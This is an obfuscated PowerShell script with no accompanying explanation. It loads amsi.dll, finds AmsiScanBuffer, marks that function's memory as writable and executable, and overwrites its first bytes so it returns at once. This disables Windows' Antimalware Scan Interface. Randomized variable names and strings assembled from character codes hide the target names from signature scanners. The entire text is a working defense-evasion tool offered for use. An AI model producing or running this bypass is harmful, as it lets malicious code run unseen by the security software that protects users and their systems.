$J_m1ZkI2zuYZyW_h7tG = @"
using System;
using System.Runtime.InteropServices;
public class J_m1ZkI2zuYZyW_h7tG {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr KIPdb4ZnT6L3FsEh9QJ, string PS0CcygkjUNrh);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr wCD, UIntPtr byxsUJ, uint VmSU_xF8NGkUHznU6c67, out uint duUlKxXAf8);
}
"@

Add-Type $J_m1ZkI2zuYZyW_h7tG

$bR26xJbuEB5_JPD = [J_m1ZkI2zuYZyW_h7tG]::LoadLibrary("$([Char]([bYTE]0x61)+[cHar]([byte]0x6d)+[cHAr](115+28-28)+[ChaR](105+13-13)+[cHaR]([BYTE]0x2e)+[char]([bYtE]0x64)+[char]([BYtE]0x6c)+[cHaR](12+96))")
$v96ozu4I = [J_m1ZkI2zuYZyW_h7tG]::GetProcAddress($bR26xJbuEB5_JPD, "$([cHar]([BytE]0x41)+[cHaR]([BytE]0x6d)+[cHar](115+5-5)+[chAr](105)+[char](40+43)+[CHaR](99)+[cHAr](97+91-91)+[chAR]([byTE]0x6e)+[cHAr]([byTE]0x42)+[CHAR]([bYtE]0x75)+[Char](102+87-87)+[ChAr](102*53/53)+[CHAr](101+17-17)+[Char]([byTe]0x72))")
$p = 0
[J_m1ZkI2zuYZyW_h7tG]::VirtualProtect($v96ozu4I, [uint32]5, 0x40, [ref]$p)
$RI19yDmm = "0xB8"
$GBApeOwUjfKHnbDNJw = "0x57"
$NosW = "0x00"
$xXqlHMs7lObX_tdOPZ = "0x07"
$Nh5Mu0Vh4kpNepaN0zR = "0x80"
$SV1PluPLT07yO2iuI1 = "0xC3"
$qIrgzApwj3Ex8DOE = [Byte[]] ($RI19yDmm,$GBApeOwUjfKHnbDNJw,$NosW,$xXqlHMs7lObX_tdOPZ,+$Nh5Mu0Vh4kpNepaN0zR,+$SV1PluPLT07yO2iuI1)
[System.Runtime.InteropServices.Marshal]::Copy($qIrgzApwj3Ex8DOE, 0, $v96ozu4I, 6)